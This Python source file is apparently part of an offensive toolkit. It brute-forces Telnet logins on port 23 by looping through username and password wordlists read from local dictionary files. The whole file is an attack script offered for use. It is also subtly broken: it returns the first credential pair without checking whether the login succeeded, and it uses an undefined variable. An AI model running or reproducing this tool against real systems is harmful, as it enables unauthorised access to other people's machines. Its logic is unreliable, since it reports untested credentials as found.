from __future__ import print_function
import os
import sys
import time
import socket
from time import sleep
import telnetlib

teluser = []
telpass = []

def telnetBrute0x00(ip, usernames, passwords, port, delay):
    telnet = telnetlib.Telnet(ip)
    telnet.read_until("login: ")
    for username in usernames:
        for password in passwords:
            try:
                telnet.write(str(username) + "\n")
                telnet.read_until("Password: ")
                telnet.write(str(password) + "\n")
                telnet.write("vt100\n")
                telnet.close()
                return username,password
            except socket.error:
                print( " [-] Error: Connection failed! Port closed!" + W)
            except KeyboardInterrupt:
                telnet.close()
                sys.exit(1)
            except:
                print(" [*] Checking : ")
                sleep(delay)

def telnetbrute(web):


    with open('app/views/module/file/dict/brute/telnet/telnet_user.lst') as users:
        for user in users:
            user = user.strip('\n')
            teluser.append(user)
    with open('app/views/module/file/dict/brute/telnet/telnet_pass.lst') as users:
        for passw in users:
            passw = passw.strip('\n')
            telpass.append(passw)

    web = web.replace('https://','')
    web = web.replace('http://','')
    ip = socket.gethostbyname(web)
    port = 23
    delay = 0
    time.sleep(1)
    username,password = telnetBrute0x00(ip, teluser, telpass, port, delay)
    return username,password